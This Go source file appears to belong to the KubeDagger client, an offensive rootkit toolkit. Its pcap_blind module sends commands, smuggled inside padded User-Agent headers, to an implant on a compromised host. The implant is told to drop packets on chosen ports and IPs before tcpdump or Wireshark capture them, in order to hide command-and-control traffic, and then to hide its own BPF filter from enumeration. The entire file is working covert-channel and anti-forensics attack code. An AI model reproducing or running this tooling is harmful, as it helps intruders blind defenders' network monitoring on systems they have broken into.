package pcap_blind

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type PcapBlindResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, hidePorts, hideIPs, output string) error {
	result := &PcapBlindResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_af_packet_filter",
			"attach socket filter to AF_PACKET sockets used by tcpdump/Wireshark",
			"pcap_attach_filter",
		},
		{
			"configure_port_filter",
			"load port list into BPF map for packet drop decisions",
			"pcap_set_ports",
		},
		{
			"configure_ip_filter",
			"load IP list into BPF map to hide C2 traffic from captures",
			"pcap_set_ips",
		},
		{
			"enable_packet_drop",
			"activate filter to drop matching packets before they reach capture tools",
			"pcap_enable_drop",
		},
		{
			"hide_bpf_filter_program",
			"conceal the socket filter from BPF program enumeration",
			"pcap_hide_program",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + hidePorts + "#" + hideIPs
		status := sendPcapCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendPcapCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/pcap_blind", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
